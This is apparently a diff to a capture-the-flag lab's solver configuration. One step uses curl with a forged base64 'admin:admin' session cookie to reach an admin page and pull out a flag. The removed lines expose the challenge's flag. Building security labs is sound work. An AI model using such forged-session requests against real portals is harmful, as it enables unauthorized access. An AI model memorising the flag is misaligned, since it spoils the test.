@@ -28,9 +28,9 @@ solver:
     expect: '403'
   - name: A forged admin session reveals the training token
     command: 'curl -s -H ''Cookie: session=YWRtaW46YWRtaW4='' http://{target.portal}:8080/admin | grep -o ''OCR{[^}]*}'''
-    expect: OCR{forged_sessions_bypass_mfa}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{forged_sessions_bypass_mfa}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
